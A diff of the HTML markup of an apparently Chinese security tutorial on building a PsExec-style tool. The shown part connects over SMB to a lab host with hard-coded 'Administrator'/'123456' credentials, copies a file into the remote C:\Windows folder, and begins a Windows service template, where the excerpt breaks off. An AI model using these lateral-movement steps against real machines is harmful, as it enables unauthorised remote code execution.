+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>wmain</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>wchar_t</span><span style=color:#f92672>*</span> argv[])
 </span></span><span style=display:flex><span>    {
 </span></span><span style=display:flex><span>        std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Hello World!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
 </span></span><span style=display:flex><span>        ConnectSMBServer(TEXT(<span style=color:#e6db74>&#34;192.168.3.130&#34;</span>), TEXT(<span style=color:#e6db74>&#34;Administrator&#34;</span>), TEXT(<span style=color:#e6db74>&#34;123456&#34;</span>));
 </span></span><span style=display:flex><span>    }
-</span></span></code></pre></div><p>可以看到，传入对应的参数即可建立一个SMB连接。</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/9e36b204-4f5f-11ec-ab83-00d861bf4abb.png alt=2020-04-01-14-35-14></p></p><p>建立SMB连接后，我们需要继续编写一个通过SMB协议在远程服务器上创建文件的函数。</p><h3 id=关于smb上传文件>关于SMB上传文件</h3><p>说到这里，可能有的朋友觉得实现这个需求会非常的复杂，但是经过我的假设与验证，发现实现起来并不难，在后来的日子里，我获得了PsExec的源代码后，我这个方法比它更加方便直接。</p><p><strong>CIFS（Common Internet File System），它是Windows上的一个文件共享协议。</strong></p><p>CIFS 可以使您达到以下功能：</p><ol><li>访问服务器本地文件并读写这些文件</li><li>与其它用户一起共享一些文件块</li><li>在断线时自动恢复与网络的连接</li><li>使用统一码（Unicode）文件名：文件名可以使用任何字符集，而不局限于为英语或西欧语言设计的字符集。</li></ol><p>通过CIFS协议我们才能够将网络上的文件共享映射为本地资源去访问，大家可能熟悉<code>net use</code></p><p>但不真正了解背后的原理。既然能够将网络文件映射到本地，相当于构建了一个逻辑上的本地磁盘，进而推理出我们直接利用Windows文件相关的API来操作共享文件都是可行的。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span>BOOL <span style=color:#a6e22e>CopyFile</span>( 
+</span></span></code></pre></td></tr></table></div></div><p>可以看到，传入对应的参数即可建立一个SMB连接。</p><p><img src=https://images.payloads.online/9e36b204-4f5f-11ec-ab83-00d861bf4abb.png alt=2020-04-01-14-35-14></p><p>建立SMB连接后，我们需要继续编写一个通过SMB协议在远程服务器上创建文件的函数。</p><h3 id=关于smb上传文件>关于SMB上传文件</h3><p>说到这里，可能有的朋友觉得实现这个需求会非常的复杂，但是经过我的假设与验证，发现实现起来并不难，在后来的日子里，我获得了PsExec的源代码后，我这个方法比它更加方便直接。</p><p><strong>CIFS（Common Internet File System），它是Windows上的一个文件共享协议。</strong></p><p>CIFS 可以使您达到以下功能：</p><ol><li>访问服务器本地文件并读写这些文件</li><li>与其它用户一起共享一些文件块</li><li>在断线时自动恢复与网络的连接</li><li>使用统一码（Unicode）文件名：文件名可以使用任何字符集，而不局限于为英语或西欧语言设计的字符集。</li></ol><p>通过CIFS协议我们才能够将网络上的文件共享映射为本地资源去访问，大家可能熟悉<code>net use</code></p><p>但不真正了解背后的原理。既然能够将网络文件映射到本地，相当于构建了一个逻辑上的本地磁盘，进而推理出我们直接利用Windows文件相关的API来操作共享文件都是可行的。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span>BOOL <span style=color:#a6e22e>CopyFile</span>( 
 </span></span><span style=display:flex><span>        LPCTSTR lpExistingFileName, <span style=color:#75715e>// 你要拷贝的源文件名 
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>        LPCTSTR lpNewFileName, <span style=color:#75715e>// 你要拷贝的目标文件名 
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>        BOOL bFailIfExists <span style=color:#75715e>// 如果目标已经存在，不拷贝（True）并返回False，覆盖目标（false）
 </span></span></span><span style=display:flex><span><span style=color:#75715e></span>    );
-</span></span></code></pre></div><p>实现代码如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span>BOOL <span style=color:#a6e22e>UploadFileBySMB</span>(LPCWSTR lpwsSrcPath, LPCWSTR lpwsDstPath)
+</span></span></code></pre></td></tr></table></div></div><p>实现代码如下：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span>BOOL <span style=color:#a6e22e>UploadFileBySMB</span>(LPCWSTR lpwsSrcPath, LPCWSTR lpwsDstPath)
 </span></span><span style=display:flex><span>{
 </span></span><span style=display:flex><span>    DWORD dwRetVal;
 </span></span><span style=display:flex><span>    dwRetVal <span style=color:#f92672>=</span> CopyFile(lpwsSrcPath, lpwsDstPath, FALSE);
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> dwRetVal <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>?</span> TRUE : FALSE;
 </span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>是不是非常简单，它就像操作本地文件一样简单。</p><p>为了方便测试，我在本地创建了一个<code>test.txt</code> 文本文件，然后我把<code>wmain</code> 更改了一下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>wmain</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>wchar_t</span><span style=color:#f92672>*</span> argv[])
+</span></span></code></pre></td></tr></table></div></div><p>是不是非常简单，它就像操作本地文件一样简单。</p><p>为了方便测试，我在本地创建了一个<code>test.txt</code> 文本文件，然后我把<code>wmain</code> 更改了一下：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>wmain</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>wchar_t</span><span style=color:#f92672>*</span> argv[])
 </span></span><span style=display:flex><span>{
 </span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Hello World!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
 </span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (ConnectSMBServer(TEXT(<span style=color:#e6db74>&#34;192.168.3.130&#34;</span>), TEXT(<span style=color:#e6db74>&#34;Administrator&#34;</span>), TEXT(<span style=color:#e6db74>&#34;123456&#34;</span>)) <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>) {
@@ -64,8 +130,165 @@
 </span></span><span style=display:flex><span>        }
 </span></span><span style=display:flex><span>    }
 </span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/9e7141a8-4f5f-11ec-9a84-00d861bf4abb.png alt=2020-04-01-14-36-24></p></p><p>在Win2008上的<code>C:\Windows\</code>查看：</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/9eb10dba-4f5f-11ec-8c64-00d861bf4abb.png alt=2020-04-01-14-36-42></p></p><p>文件写入成功。</p><h2 id=0x05-编写服务程序>0x05 编写服务程序</h2><p>Windows 服务被设计用于需要在后台运行的应用程序以及实现没有用户交互的任务，并且部分服务是以SYSTEM权限启动。为了编写服务程序，我们需要了解一些关于服务的概念。</p><p>服务控制管理器（SCM：<code>Services Control Manager</code>）是一个管理系统所有服务的进程。当 SCM 启动某个服务时，它等待某个进程的主线程来调用 StartServiceCtrlDispatcher 函数。将分派表传递给 StartServiceCtrlDispatcher。这将把调用进程的主线程转换为控制分派器。该分派器启动一个新线程，该线程运行分派表中每个服务的 ServiceMain 函数分派器还监视程序中所有服务的执行情况。然后分派器将控制请求从 SCM 传给服务。</p><h3 id=servicemain-函数>ServiceMain 函数</h3><p>该函数是服务的入口点。它运行在一个单独的线程当中，这个线程是由控制分派器创建的。ServiceMain 应该尽可能早早为服务注册控制处理器。这要通过调用 RegisterServiceCtrlHadler 函数来实现。</p><p>这里可以直接提供一个服务模板：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c++ data-lang=c++><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;Windows.h&gt;</span><span style=color:#75715e>
-</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;stdio.h&gt;  </span><span style=color:#75715e>
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://images.payloads.online/9e7141a8-4f5f-11ec-9a84-00d861bf4abb.png alt=2020-04-01-14-36-24></p><p>在Win2008上的<code>C:\Windows\</code>查看：</p><p><img src=https://images.payloads.online/9eb10dba-4f5f-11ec-8c64-00d861bf4abb.png alt=2020-04-01-14-36-42></p><p>文件写入成功。</p><h2 id=0x05-编写服务程序>0x05 编写服务程序</h2><p>Windows 服务被设计用于需要在后台运行的应用程序以及实现没有用户交互的任务，并且部分服务是以SYSTEM权限启动。为了编写服务程序，我们需要了解一些关于服务的概念。</p><p>服务控制管理器（SCM：<code>Services Control Manager</code>）是一个管理系统所有服务的进程。当 SCM 启动某个服务时，它等待某个进程的主线程来调用 StartServiceCtrlDispatcher 函数。将分派表传递给 StartServiceCtrlDispatcher。这将把调用进程的主线程转换为控制分派器。该分派器启动一个新线程，该线程运行分派表中每个服务的 ServiceMain 函数分派器还监视程序中所有服务的执行情况。然后分派器将控制请求从 SCM 传给服务。</p><h3 id=servicemain-函数>ServiceMain 函数</h3><p>该函数是服务的入口点。它运行在一个单独的线程当中，这个线程是由控制分派器创建的。ServiceMain 应该尽可能早早为服务注册控制处理器。这要通过调用 RegisterServiceCtrlHadler 函数来实现。</p><p>这里可以直接提供一个服务模板：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 93
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 94
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 95
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 96
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 97
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 98
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 99
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">100
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">101
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">102
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">103
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">104
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">105
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">106
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">107
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">108
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">109
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">110
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">111
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">112
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">113
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">114
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">115
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">116
